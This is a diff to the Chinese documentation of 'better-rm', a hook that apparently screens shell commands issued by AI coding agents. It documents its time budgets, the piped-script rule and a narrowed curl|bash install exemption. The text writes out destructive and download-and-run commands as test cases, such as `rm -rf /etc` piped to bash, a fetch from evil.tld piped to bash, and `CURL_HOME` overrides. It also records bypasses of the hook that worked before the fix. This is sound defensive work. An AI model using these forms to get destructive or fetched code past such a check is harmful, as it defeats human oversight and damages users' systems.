@@ -520,8 +520,15 @@ macOS 用 firmlink 把資料卷宗接進根目錄，所以 `/Users/you` 與 `/Sy
 不做任何裁決，也不會擋下命令**。所以現在改成：時間用完就以「我停止讀了」拒絕，訊息會寫出
 判了幾個、總共幾個，並建議拆成多條命令。用「時間」而不是「數量」，是因為每個目標的成本差
 兩個數量級：先試過 5,000 的數量上限，它會誤擋 `find . -exec rm …×6000`（6,001 個目標、
-118ms、什麼都不刪）。**未涵蓋的部分明講**：產生目標的斷詞在第一次檢查之前就跑完，成本約
-每 MB 40ms，光靠斷詞就跑贏逾時的巨大命令，這裡擋不住。
+118ms、什麼都不刪）。**未涵蓋的部分明講**：產生目標的斷詞在第一次檢查之前就跑完，2,000ms 的預算管不到它。
+2026-09-04 補上一道**「失敗讀取」預算**（`MAX_FAILED_SUBSTITUTION_READS = 64`）：雙引號裡的
+`$(`／`${`／`` ` `` 讀不到收尾時會掃到輸入結尾、而呼叫端只前進一個字元，於是「沒收尾的開頭
+數」是平方級的成本。實測（走真正的 stdin 進入點，命令是 `echo "` + 開頭字 ×n + `" ; rm -rf
+/etc`）：`${` 在 117KB 要 6,071ms，超過 live 的 5,000ms 逾時，加上預算之後是 52ms。
+**只有「失敗」的讀取花預算**，所以替換讀得完的真實命令碰不到它。**仍未涵蓋**：`$(` 那一半的
+成本主要在命令替換掃描裡，那是既有的、與這次改動無關的平方級成本——117KB 從 37,015ms 降到
+18,355ms，仍然遠超過逾時。要完全封住只剩「輸入長度上限 + fail-closed 拒絕」一條路，而那是
+姿態改變（實測：上限要壓到 16KB 才有餘裕），屬於使用者的裁決，見 KNOWN-RESIDUALS.md 的 R5-a。
 
 **發生頻率：不算罕見。** `$(which X) "$ARG"` 是很常見的寫法；本次修改的覆審者
 在審查過程中自己就踩到兩次。請當成日常會遇到的事，而不是偶爾。
@@ -542,7 +549,7 @@ hooks 執行時需要 `node` 可用。Codex 還會要求使用者透過 `/hooks`
 
 ### 從 pipe 或 process substitution 進來的腳本會被拒絕（規則：unscannable piped script）
 
-當 shell（`bash`／`sh`／`dash`／`zsh`／`ksh`／`fish`／`source`／`.`，含
+當 shell（`bash`／`sh`／`dash`／`zsh`／`ksh`／`fish`／`csh`／`tcsh`／`source`／`.`，含
 `sudo`／`env`／`timeout`／`nice` 等外殼）要執行的**腳本本身**是從 pipe 或 process
 substitution 進來的，這道閘門必須先讀得到那段腳本，否則**拒絕執行**。理由是實測出來的：
 `cat <<EOF | bash` 與 `bash <<< "…"`（腳本寫在命令列上）一直是被判定的，而逐位元組等價的
@@ -553,7 +560,7 @@ substitution 進來的，這道閘門必須先讀得到那段腳本，否則**�
 
 | 產生器 | 結果 |
 |---|---|
-| 字面產生器：`echo`／`printf` 的字（沒有 `$`、反引號）、`cat <<EOF` | 讀出來當巢狀命令判：`echo hi \| bash` 允許，`echo "rm -rf /etc" \| bash` 以受保護目錄 `/etc` 拒絕 |
+| 字面產生器：`echo`／`printf` 的字（沒有 `$`、反引號）、`cat <<EOF` | 讀出來當巢狀命令判：`echo hi \| bash` 允許，`echo "rm -rf /etc" \| bash` 以受保護目錄 `/etc` 拒絕。**掃的文字有三份**：原樣接起來的 argv、把開頭的選項字拿掉之後的 argv（`printf` 再多丟掉格式字串），以及每一個含空白的操作元。少了中間那一份，`echo -e rm -rf /etc \| bash` 這種「刪除被寫成分開的字」的寫法在任何一份文字裡 `rm` 都不在命令位置上，2026-09-04 之前是**放行**的（實測 touch payload 在 /bin/bash 3.2.57、bash 5.x、sh、zsh、dash、ksh 下都真的執行） |
 | `PIPED_SCRIPT_EXCEPTIONS` 上的安裝路徑 | 放行（見下一節） |
 | 其他任何東西，含解析不出來的產生器 | **拒絕執行**，訊息會寫出規則名稱與繞法 |
 
@@ -571,8 +578,8 @@ substitution 進來的，這道閘門必須先讀得到那段腳本，否則**�
 | `curl … \| $CMD` | 展開後才知道的命令字可能就是 shell，與 `$CMD <<< …` 得到同一個答案 |
 | `bash <<< "$(curl -s …)"` | 腳本文字看得見，但裡面的命令替換輸出看不見 |
 | `curl … \| bash -O extglob`、`-o pipefail`、`--rcfile f` | 引數是分開一個字的 carrier 選項，那個字不是腳本檔（`bash -O extglob script.sh` 仍允許） |
-| `curl … \| bash < /dev/stdin`、`< /dev/fd/0`、`0< /dev/stdin`、`<>` | 目標就是 pipe 自己的重導向，並沒有把腳本從 pipe 拿走（`bash < script.sh` 仍允許） |
-| `bash /dev/fd/3 3< <(curl …)`、`exec 3< <(curl …); bash /dev/fd/3` | `/dev/fd/N` 指的是開了那個 fd 的 process substitution，不是檔案 |
+| `curl … \| bash < /dev/stdin`、`< /dev/fd/0`、`< /proc/self/fd/0`、`0< /dev/stdin`、`<>` | 目標就是 pipe 自己的重導向，並沒有把腳本從 pipe 拿走（`bash < script.sh` 仍允許）。`/proc/self/fd/0` 是同一個 pipe 在 Linux 上的寫法，而本專案有出貨到 Linux（`install.sh`、CI 跑在 ubuntu-24.04）|
+| `bash /dev/fd/3 3< <(curl …)`、`bash /proc/self/fd/3 3< <(curl …)`、`exec 3< <(curl …); bash /dev/fd/3` | `/dev/fd/N`（與它的 `/proc/self/fd/N` 拼法）指的是開了那個 fd 的 process substitution，不是檔案 |
 | `curl … \| bash -c "$(cat)"` | 腳本看得見，但有 pipe 在餵它時，`-c` 字串裡的命令替換讀的就是那個 pipe |
 | `curl … \| bash \` | 單獨的尾端反斜線沒有指名任何檔案；bash 3.2 會執行從 pipe 進來的腳本（5.3 則報錯） |
 | `echo hi \| bash -c "…$(date)…"` | 上一列的代價：有 pipe 餵著時，`-c` 字串裡**任何**讀不出來的命令替換都會被擋（沒有 pipe 的 `bash -c "$(date)"` 不受影響） |
@@ -629,7 +636,7 @@ curl -sSL https://raw.githubusercontent.com/sieg-wang/better-rm/main/install-hoo
 - 不要用 `http://`，不要用萬用字元——比對就是 `startsWith`，維持這麼簡單。
 - 結尾的 `/` 是有作用的：少了它，`better-rm-evil` 也會命中。
 
-比對還有三個收窄條件，每一個都是實測出來的：
+比對還有四個收窄條件，每一個都是實測出來的：
 
 1. 產生器必須是 `curl` 或 `wget`，而且**只有一個非選項操作元**（那個網址）。
    `curl -sSL https://evil.tld/y.sh <豁免網址> | bash` 因此被擋。
@@ -642,6 +649,17 @@ curl -sSL https://raw.githubusercontent.com/sieg-wang/better-rm/main/install-hoo
    -sSL <逐位元組符合前綴的網址>` 會從 loopback 的 TLS 伺服器取回攻擊者控制的內容，
    `--resolve`、`--proxy`、`--unix-socket`、`-K`、`-o` 同理。白名單之外的選項一律讓產生器
    回到「讀不到」，也就是拒絕。
+4. **產生器那個字前面必須什麼都沒有，而且必須是赤裸的 `curl`／`wget`**：不得有環境變數指派
+   （`https_proxy=`、`CURL_HOME=`、`WGETRC=`、`CURL_CA_BUNDLE=`、`LD_PRELOAD=`、`PATH=`），
+   不得有透明外殼（`env`／`sudo`／`command`／`exec`／`nice`／`nohup`／`setsid`／`time`／
+   `builtin`／`noglob`／`!`，以及它們的任意串接），也不得帶路徑（`/usr/bin/curl`、`./curl`、
+   `/tmp/evil/curl`）。理由與第 3 點是同一個，而且更直接：`CURL_HOME` 指的就是 `-K` 指的那份
+   設定檔、`WGETRC` 就是 `--config`，而第 3 點早就把那兩個選項擋掉了——實測 2026-09-04，
+   `curl -K /tmp/evil/.curlrc <豁免網址> | bash` 被拒，`CURL_HOME=/tmp/evil curl <同一個網址>
+   | bash` 卻放行。產生器的標籤取自 `path.basename()`，所以少了「必須赤裸」這一半，任何一個
+   叫做 `curl` 的執行檔都會繼承豁免。**shell 的控制字不算前綴**（`if`／`then`／`do`／`{`）：
+   那是語法、搬不動抓取，把它算進去只會讓 `if true; then curl <豁免網址> | bash; fi` 被誤擋；
+   `\curl`、`"curl"`、`'curl'` 也照舊豁免，因為斷詞後是同一個字、bash 解析到的是同一個執行檔。
 
 上面每一條（四條放行、以及 owner 換掉、port 寫法、host 後綴、repo 前綴、`..`、`%2e`、
 第二個網址、`--connect-to`／`--resolve`／`--proxy`／`--unix-socket`／`-K`／`-o` 等擋掉的
